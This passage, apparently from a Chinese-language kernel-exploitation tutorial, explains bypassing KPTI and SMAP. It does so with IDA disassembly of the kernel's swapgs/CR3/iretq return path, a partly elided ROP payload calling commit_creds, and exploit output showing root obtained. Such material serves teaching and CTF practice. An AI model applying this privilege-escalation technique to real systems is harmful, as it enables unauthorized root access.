+  .text:FFFFFFFF81200F89                 pop     rax
+  .text:FFFFFFFF81200F8A                 pop     rdi
+  .text:FFFFFFFF81200F8B                 call    cs:off_FFFFFFFF82040088
+  .text:FFFFFFFF81200F91                 jmp     cs:off_FFFFFFFF82040080
+
+  .....
+  .data:FFFFFFFF82040088 off_FFFFFFFF82040088 dq offset sub_FFFFFFFF8146D4E0
+  .data:FFFFFFFF82040080 off_FFFFFFFF82040080 dq offset sub_FFFFFFFF81200FC0
+
+  .....
+  .text.native_swapgs:FFFFFFFF8146D4E0 sub_FFFFFFFF8146D4E0 proc near          ; CODE XREF: sub_FFFFFFFF8100A540+E↑p
+  .text.native_swapgs:FFFFFFFF8146D4E0                                         ; sub_FFFFFFFF8100A570+17↑p ...
+  .text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp
+  .text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp
+  .text.native_swapgs:FFFFFFFF8146D4E4                 swapgs
+  .text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp
+  .text.native_swapgs:FFFFFFFF8146D4E8                 retn
+  .text.native_swapgs:FFFFFFFF8146D4E8 sub_FFFFFFFF8146D4E0 endp
+
+  ...
+  .text:FFFFFFFF81200FC0                 test    byte ptr [rsp+arg_18], 4
+  .....
+  .text:FFFFFFFF8120102E                 mov     rdi, cr3
+  .text:FFFFFFFF81201031                 jmp     short loc_FFFFFFFF81201067
+  .text:FFFFFFFF81201033 ; ------------------------------------------------------
+  .text:FFFFFFFF81201067 loc_FFFFFFFF81201067:                   ; CODE XREF: sub_FFFFFFFF81200FC0+71↑j
+  .text:FFFFFFFF81201067                 or      rdi, 1000h
+  .text:FFFFFFFF8120106E                 mov     cr3, rdi
+
+  ....
+  .text:FFFFFFFF81200FC7                 iretq</code></pre>
+<p><code>swapgs</code>用于切换kernel-mode和user-mode的GS寄存器</p>
+<p><code>mov rdi, cr3; or rdi, 0x1000; mov cr3, rdi;</code>代码段用于切换CR3寄存器。</p>
+<p><code>iretq</code>切换到user-mode。</p>
+<p>因此，利用该函数的代码片段即可以完成<code>swapgs; swap page tables; iretq</code>等操作，构造的<code>payload</code>如下</p>
+<div class="highlight"><pre><span></span><span class="p">...</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_trampoline</span><span class="p">;</span> 
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+    <span class="p">....</span>
+</pre></div>
+<p>也可以利用gadget执行交换page tables的操作，有同样的效果，这是这个函数内集成了多个gadget序列，比较便利。</p>
+<p>这种方式可以绕过KPTI策略。</p>
+<pre><code>/ $ ./exploit 
+  [*] Saved state
+  [*] Opened device
+  [*] Leak 160 bytes
+  [*] Cookie: 0x14324065f2932600
+  [*] Prepared payload
+  [*] Returned to userland
+  [*] UID: 0, got root priv
+  / # id
+  uid=0 gid=0</code></pre>
+<h4 data-content="1" id="8db9cd8fb72f206da77b2af02aad6b02">Bypass SMAP</h4>
+<p>同SMEP类似，当进程在kernel-mode下时，userspace的地址空间标记为不可读、不可写。</p>
+<p>显然，通过ROPchain的方式绕过SMEP的策略也适用于绕过SMAP（结合绕过KPTI的策略）</p>
+<p>参考</p>
+<p><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8%E9%A1%B5%E8%A1%A8%E9%9A%94%E7%A6%BB" target="_blank">WIKI-内核页表隔离</a></p>
+<p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/" target="_blank">2021: "Learning Linux Kernel Exploitation"</a> [article] [<a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/" target="_blank">part 2</a>] [<a href="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/" target="_blank">part 3</a>]</p>
+</div>
+</div>
